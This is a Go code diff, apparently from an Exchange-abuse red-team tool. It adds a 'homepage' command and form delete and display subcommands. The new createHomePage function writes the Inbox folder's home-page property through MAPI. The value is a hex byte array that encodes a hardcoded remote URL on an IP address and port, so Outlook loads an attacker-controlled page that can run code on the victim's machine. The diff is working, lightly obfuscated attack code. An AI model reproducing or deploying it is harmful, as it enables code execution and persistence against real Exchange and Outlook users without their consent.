@@ -662,6 +662,21 @@ func displayForms(c *cli.Context) error {
 	return nil
 }
 
+func createHomePage() {
+	prop := []byte{0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x68, 0x00, 0x74, 0x00, 0x74, 0x00, 0x70, 0x00, 0x3A, 0x00, 0x2F, 0x00, 0x2F, 0x00, 0x32, 0x00, 0x31, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x34, 0x00, 0x33, 0x00, 0x2E, 0x00, 0x32, 0x00, 0x30, 0x00, 0x36, 0x00, 0x3A, 0x00, 0x39, 0x00, 0x30, 0x00, 0x39, 0x00, 0x30, 0x00, 0x2F, 0x00, 0x70, 0x00, 0x6B, 0x00, 0x2E, 0x00, 0x68, 0x00, 0x74, 0x00, 0x6D, 0x00, 0x6C, 0x00, 0x00, 0x00}
+	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
+	propertyTags := make([]mapi.TaggedPropertyValue, 1)
+	propertyTags[0] = mapi.TaggedPropertyValue{mapi.PropertyTag{mapi.PtypBinary, 0x36DF}, append(utils.COUNT(len(prop)), prop...)}
+	//propertyTags[0] = mapi.TaggedPropertyValue{mapi.PropertyTag{mapi.PtypString8, 0x3001}, []byte{0x49, 0x6E, 0x62, 0x6F, 0x78}}
+	r, e := mapi.SetFolderProperties(folderid, propertyTags)
+	fmt.Println(r, e)
+	props := make([]mapi.PropertyTag, 1)
+	props[0] = mapi.PropertyTag{mapi.PtypBinary, 0x36DF}
+	rx, ex := mapi.GetFolder(mapi.INBOX, props)
+	fmt.Println(rx, ex)
+
+}
+
 func main() {
 
 	app := cli.NewApp()
@@ -1116,6 +1131,69 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 							cli.OsExiter(1)
 						}
 						err = triggerForm(c)
+						exit(err)
+						return nil
+					},
+				},
+				{
+					Name:  "delete",
+					Usage: "delete an existing form",
+					Flags: []cli.Flag{
+						cli.StringFlag{
+							Name:  "suffix,s",
+							Value: "",
+							Usage: "The suffix used when creating the form. This must be the same as the value used when the form was created.",
+						},
+					},
+					Action: func(c *cli.Context) error {
+						if c.String("suffix") == "" {
+							return cli.NewExitError("The suffix is required. Please use the same value as supplied to the 'add' command. Default is pew", 1)
+						}
+
+						err := connect(c)
+						if err != nil {
+							utils.Error.Println(err)
+							cli.OsExiter(1)
+						}
+						err = deleteForm(c)
+						exit(err)
+						return nil
+					},
+				},
+				{
+					Name:  "display",
+					Usage: "display all existing forms",
+
+					Action: func(c *cli.Context) error {
+
+						err := connect(c)
+						if err != nil {
+							utils.Error.Println(err)
+							cli.OsExiter(1)
+						}
+						err = displayForms(c)
+						exit(err)
+						return nil
+					},
+				},
+			},
+		},
+		{
+			Name:  "homepage",
+			Usage: "Interact with the forms function.",
+			Subcommands: []cli.Command{
+				{
+					Name:  "add",
+					Usage: "creates a new form. ",
+					Flags: []cli.Flag{},
+					Action: func(c *cli.Context) error {
+
+						err := connect(c)
+						if err != nil {
+							utils.Error.Println(err)
+							cli.OsExiter(1)
+						}
+						createHomePage()
 						exit(err)
 						return nil
 					},
